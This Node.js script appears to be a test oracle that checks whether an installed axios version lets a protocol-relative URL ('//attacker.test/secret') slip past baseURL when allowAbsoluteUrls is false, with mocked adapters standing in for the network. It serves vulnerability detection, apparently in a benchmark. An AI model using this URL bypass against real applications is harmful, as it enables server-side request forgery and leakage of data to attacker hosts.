const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = `axios-ssrf-oracle-${process.pid}-${Date.now()}`;
    const baseDir = path.join(os.tmpdir(), marker);
    fs.mkdirSync(baseDir, { recursive: true });

    const axiosModule = require('axios');
    const axios = axiosModule && axiosModule.default ? axiosModule.default : axiosModule;

    // Benign call: normal relative URL joining baseURL should work synchronously
    // without performing any network I/O by using a custom adapter.
    let benignConfig;
    try {
      const benignResp = await axios.get('/ok', {
        baseURL: 'http://example.test/api/',
        allowAbsoluteUrls: false,
        adapter: async (config) => {
          benignConfig = config;
          return {
            data: 'ok',
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });

      if (!benignResp || benignResp.status !== 200) {
        throw new Error('benign_response_unexpected');
      }

      const benignUrl = benignConfig && benignConfig.url ? String(benignConfig.url) : '';
      if (!benignUrl.includes('/ok')) {
        throw new Error('benign_url_missing_relative_path');
      }
      evidence += `benign_url:${benignUrl};`;
    } catch (e) {
      const msg = String((e && e.message) || e);
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: `benign_failed:${msg.slice(0, 200)}`
      }));
      return;
    }

    operation_completed = true;

    // Malicious call: protocol-relative URL should be blocked when allowAbsoluteUrls=false.
    // Vulnerable versions pass it through; patched versions reject before adapter execution.
    let maliciousAdapterCalled = false;
    let maliciousObservedUrl = '';
    try {
      await axios.get('//attacker.test/secret', {
        baseURL: 'http://example.test/api/',
        allowAbsoluteUrls: false,
        adapter: async (config) => {
          maliciousAdapterCalled = true;
          maliciousObservedUrl = config && config.url ? String(config.url) : '';
          return {
            data: 'unexpected',
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });

      exploit_succeeded = true;
      evidence += `malicious_allowed:url=${maliciousObservedUrl || 'unknown'};`;
    } catch (e) {
      const msg = String((e && e.message) || e);
      if (maliciousAdapterCalled) {
        exploit_succeeded = true;
        evidence += `malicious_adapter_called_then_error:${msg.slice(0, 160)};url=${maliciousObservedUrl || 'unknown'};`;
      } else {
        exploit_succeeded = false;
        evidence += `malicious_blocked:${msg.slice(0, 160)};`;
      }
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  } catch (e) {
    const msg = String((e && e.message) || e);
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: `setup_or_runtime_error:${msg.slice(0, 200)}`
    }));
  }
})();